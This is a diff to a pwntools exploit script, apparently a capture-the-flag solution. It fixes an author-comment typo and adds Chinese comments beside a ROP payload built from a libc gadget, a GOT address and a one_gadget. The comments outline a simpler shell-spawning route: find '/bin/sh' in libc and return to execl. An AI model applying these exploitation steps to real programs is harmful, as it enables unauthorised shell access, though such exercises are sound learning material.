@@ -1,6 +1,6 @@
 #!/usr/bin/python env
 #coding:utf-8
-#authro:KimballCho
+#author:KimballCho
 
 from pwn import *
 
@@ -143,3 +143,8 @@ offset_xor_pop_gadget = 0x1afd3
 libc_xor_pop_gadget = offset_addr + offset_xor_pop_gadget
 payload2_0 = p32(0) * 23 + p32(libc_xor_pop_gadget) + p32(got_libc_real) + p32(0) + p32(magic_addr_2_0)
 shellPwn(payload2_0)
+#此payload的主要思路还是为了用一下one_gadget，对于已经有了libc和eip，以及栈内容任意写入，完全可以用更简单的方式
+#1. strings找到'/bin/sh'在libc中的位置 
+#2. 写好参数['/bin/sh'], 0 
+#3. ret到execl
+#但是这样就少了很多乐趣了，是不是？
